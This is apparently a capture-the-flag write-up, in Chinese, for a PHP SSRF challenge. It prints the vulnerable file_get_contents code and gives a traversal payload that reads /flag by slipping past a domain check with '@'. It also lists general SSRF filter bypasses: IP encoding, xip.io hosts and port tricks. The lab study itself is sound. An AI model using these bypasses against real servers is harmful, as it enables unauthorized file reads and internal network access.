SSRF–WP

题目： 

            啊这，这怎么...这file_get_contents()有啥用呢
<?php
    echo'<center><strong>啊这，这怎么...这file_get_contents()有啥用呢</strong></center>';
    highlight_file(__FILE__);
    $url =$_GET ['url'];
    if (preg_match('/dotnet\.com/', $url)){
        if(!preg_match('/php|file|zip|bzip|zlib|base|data/i', $url)) {
            echo (file_get_contents($url));
        }
        else {
            echo('没看到过滤了吗...');
        }
    }
    else{
        echo ("这个怎么绕过呢？") ;
    }
//flag is in '/flag'
?>
这个怎么绕过呢？

第一个preg_match意思是$url中必须包含dotnet.com;
第二个!preg_match意思是不能匹配到其中的字符，有i，包含大小写，这样就把伪协议的路堵死了。
这个dotnet.com似乎没有什么用，就可以在后面加个@进行绕过：
dotnet.com@123=123
既然伪协议的路没法走，然后去找file_get_contents相关的知识，原来PHP还可以进行目录穿越：
php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。
所以我们就可以构造的payload(php如果识别不了就会当成一个目录)在进行目录穿越，穿越到根目录读取flag
payload:/?url=dotnet.com@0://../../../../../../../../flag
得到flag

知识点总结

  • SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

  • SSRF中的绕过过滤：
    @绕过：http://www.baidu.com@127.0.0.1=127.0.0.1
    将IP地址转换成十进制、八进制、十六进制：192.168.0.1>>>>0300.0250.0.1(八进制)

  • .xip.io：

    192.168.0.1.xip.io>>>192.168.0.1
    www.10.0.0.1.xip.io = 10.0.0.1
    mysite.10.0.0.1.xip.io = 10.0.0.1
    foo.bar.10.0.0.1.xip.io = 10.0.0.1

  • 端口绕过：127.0.0.1>>>127.0.0.1: 80

  • 目录穿越：php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录
